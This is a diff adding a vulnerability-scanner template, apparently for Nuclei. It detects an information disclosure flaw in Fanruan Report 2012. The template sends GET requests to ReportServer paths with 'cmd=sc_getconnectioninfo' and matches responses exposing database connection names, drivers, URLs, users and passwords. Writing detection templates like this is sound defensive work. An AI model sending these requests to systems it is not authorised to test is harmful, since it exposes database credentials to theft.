@@ -1,0 +1,39 @@
+id: fanruanoa2012-disclosure
+
+info:
+  name: Fanruan Report 2012 Information Disclosure
+  author: xc
+  severity: high
+  description: Fanruan Report 2012 has an information disclosure vulnerability, and some sensitive information can be obtained by accessing a specific URL
+  metadata:
+    max-request: 2
+  tags: oa,java,fanruan,disclosure
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ReportServer?op=fr_server&cmd=sc_getconnectioninfo"
+      - "{{BaseURL}}/WebReport/ReportServer?op=fr_server&cmd=sc_getconnectioninfo"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - '"connection"'
+          - '"name"'
+          - '"driver"'
+          - '"password"'
+          - '"url"'
+          - '"user"'
+        condition: and
+
+      - type: word
+        words:
+          - "application/json"
+        part: header
+
+# digest: 4b0a00483046022100b900f828bd204277c8567db75729453cfa606cb19b0d483fdf77c550c320ab43022100c7226d84de5f0777b215fe9a2b861232df53f2e4b5cbd730ebfc1680a9d1a820:922c64590222798bb761d5b6d8e72950
